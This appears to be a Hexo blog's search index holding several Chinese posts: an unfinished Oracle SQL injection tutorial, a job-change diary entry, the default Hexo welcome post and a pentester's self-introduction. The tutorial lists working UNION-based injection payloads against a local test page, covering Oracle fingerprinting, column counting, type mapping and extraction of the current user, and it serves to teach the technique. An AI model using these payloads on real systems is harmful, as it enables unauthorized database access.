<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>oracle注入</title>
      <link href="/2021/06/23/oracle/"/>
      <url>/2021/06/23/oracle/</url>
      
        <content type="html"><![CDATA[<p>oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库</p><p>数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。<br>数据库名和实例名可以相同也可以不同。<br>在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。<span id="more"></span></p><p>数据库实例名与ORACLE_SID<br>虽 然两者都表是oracle实例，但两者是有区别的。instance_name是oracle数据库参数。而ORACLE_SID是操作系统的环境变量。 ORACLD_SID用于与操作系统交互，也就是说，从操作系统的角度访问实例名，必须通过ORACLE_SID。在winnt平 台，ORACLE_SID还需存在于注册表中。<br>且ORACLE_SID必须与instance_name的值一致，否则，你将会收到一个错误，在unix平台，是“ORACLE not available”,在winnt平台，是“TNS:协议适配器错误”。</p><p>当前数据库下有N张表  &lt;=&gt; Oracle：当前用户下有N张表</p><ol><li>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。</li><li>RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。</li><li>CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构</li><li>一般oracle数据库安装成功后会创建几个默认用户’sys’、’system’、’public’等。</li></ol><h2 id="oracle特性"><a href="#oracle特性" class="headerlink" title="oracle特性"></a>oracle特性</h2><p>Oracle 数据库的注入不同于其他数据库，如Access 和Mysql，它包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名，</p><p>如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名</p><p>   Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录</p><p>oracle 支持– 类型注释，但是不支持;分隔执行多语句，oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle，另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些，语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。</p><h3 id="oracle注入中需要注意的一些点"><a href="#oracle注入中需要注意的一些点" class="headerlink" title="oracle注入中需要注意的一些点"></a>oracle注入中需要注意的一些点</h3><ol><li>Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。</li><li>Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”)：<br>例如: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0</span><br></pre></td></tr></table></figure></li></ol><p>Oracle的单行注释符号是–，多行注释符号/**/。</p><h4 id="支持的注释符"><a href="#支持的注释符" class="headerlink" title="支持的注释符"></a>支持的注释符</h4><p>–<br>–空格<br>/**/</p><h2 id="判断Oracle数据库"><a href="#判断Oracle数据库" class="headerlink" title="判断Oracle数据库"></a>判断Oracle数据库</h2><p>1.oracle 支持– 类型注释，但是不支持;分隔执行多语句；oracle 有很多系统表，譬如user_tables，通过对这些表的访问也可以判断出是否属于oracle；另外在oracle 里的一些函数也可以用来判断，譬如utl_http.request 这些；语言上的小细节也可以用来区分系统，譬如在oracle 里|| 是连接符号，但是在其他数据库里就不是了，所以 andchr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle 了。</p><p>利用函数来判断是否oracle数据库 如：and len(‘a’)=1（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。）</p><p>也可以通过dual来判断是否为oracle ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(\*) from dual)&gt;1 --</span><br></pre></td></tr></table></figure><p><img src="/2021/06/23/oracle/image-20210426172344519.jpg" alt="image-20210426172344519.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(\*) from dual)&gt;0 --</span><br></pre></td></tr></table></figure><p><img src="/2021/06/23/oracle/image-20210426172401354.jpg" alt="image-20210426172401354"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and (select count (*) from user_tables)&gt;0--</code><br><img src="/2021/06/23/oracle/image-20210426172624271.jpg" alt="image-20210426172624271"></p><p><code>http://127.0.0.1/oracle.php?id=1&#39; and (select count(*) from all_objects)&gt;0--</code><br><img src="/2021/06/23/oracle/image-20210429112503098.jpg" alt="image-20210429112503098"></p><p>也可以利用：单引号双位数=正确，单引号单位数=错误  的规则。</p><h2 id="联合注入步骤"><a href="#联合注入步骤" class="headerlink" title="联合注入步骤"></a>联合注入步骤</h2><p><img src="/2021/06/23/oracle/image-20210426173217803.jpg" alt="image-20210426173217803"></p><p>判断闭合，和mysql一样，此处判断为单引号闭合：<code>http://127.0.0.1/oracle.php?id=1&#39;--</code><br><img src="/2021/06/23/oracle/image-20210426173202544.jpg" alt="image-20210426173202544"></p><p>判断字段数：<code>http://127.0.0.1/oracle.php?id=1&#39; order by 4 --</code><br><img src="/2021/06/23/oracle/image-20210426173315079.jpg" alt="image-20210426173315079"></p><p>判断联合注入：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select null,null,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173439832.jpg" alt="image-20210426173439832"></p><p>判断每个字段的数据类型：</p><p>第1个字段为数字型：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,null,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173644888.jpg" alt="image-20210426173644888"></p><p>继续判断第2个字段的数据类型：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,2,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173722211.jpg" alt="image-20210426173722211"></p><p>结合上图可以判断出第2个字段为字符串类型：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210426173823520.jpg" alt="image-20210426173823520"></p><p>然后就可以以此类推来判断后面每个字段的数据类型了，这里就不再重复了。。最终判断的结果为：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,&#39;2&#39;,&#39;3&#39;,&#39;4&#39; from dual--</code><br><img src="/2021/06/23/oracle/image-20210426174000425.jpg" alt="image-20210426174000425"></p><p>判断当前数据库的用户：<code>http://127.0.0.1/oracle.php?id=-1&#39; union select 1,(select sys_context(&#39;userenv&#39;,&#39;current_user&#39;) from dual),null,null from dual--</code><br><img src="/2021/06/23/oracle/image-20210427100035497.jpg" alt="image-20210427100035497"><br><strong>未完待续</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日记-20210623</title>
      <link href="/2021/06/23/20210623%E6%97%A5%E8%AE%B0/"/>
      <url>/2021/06/23/20210623%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>今天是2021年06月23日星期三。</p><h2 id="20210623"><a href="#20210623" class="headerlink" title="20210623"></a>20210623</h2><p>广州这边又下大雨了，我已经离职了，但是我在等新公司的入职通知。</p><p>这几天我做了很多决定，我决定了自己的工作方向，我希望以后我不会为我今天所做的决定而后悔。我想要进步，我要不断的学习新的知识和新的技术，所以我原本想找一个学习技术的方向的岗位的，但是入职后发现是偏向于培训的，所以我就又离职了。现在打算去一个新的岗位，然而这个新的岗位的工作内容是跟我上一个岗位是几乎一样的，虽然我不太情愿再做这个方向，但是没有办法，为了生活只能先做着先，毕竟自己太菜了找工作不容易啊。<span id="more"></span></p><p>当然了，做这个决定我也是无奈，我只能希望通过我自己今后的最大努力去让自己以后不会后悔现在自己所做的这个决定。   </p><p>说点其他的，我这个人性格有点懒散，不太会主动去学习，都是遇到困难了或者有需求了才会去学习，我真的好像改掉这个不好的性格，我想要学习，我想要进步，希望自己能越来越好吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/06/22/hello-world/"/>
      <url>/2021/06/22/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初次见面</title>
      <link href="/2021/06/22/%E5%88%9D%E6%AC%A1%E8%A7%81%E9%9D%A2/"/>
      <url>/2021/06/22/%E5%88%9D%E6%AC%A1%E8%A7%81%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>大家好，初次见面，请多多指教。以后我都会在这里分享一些自己想要分享的东西，包括人和事以及一些技术文章还有乱七八糟的东西。我也会把这里当作是自己的另外一个内心世界，存放一些我的回忆。希望我能坚持写下去。做一个分享者，分享自己想分享的，这是多么美好的一件事啊。<span id="more"></span></p><h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>本人是一名白帽子，目前再某安全公司上班。当然啦，我不是什么大神，我也只是一个半路出家的小白。平时喜欢web渗透，但是还有很多地方需要提高，请各位多多指教。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
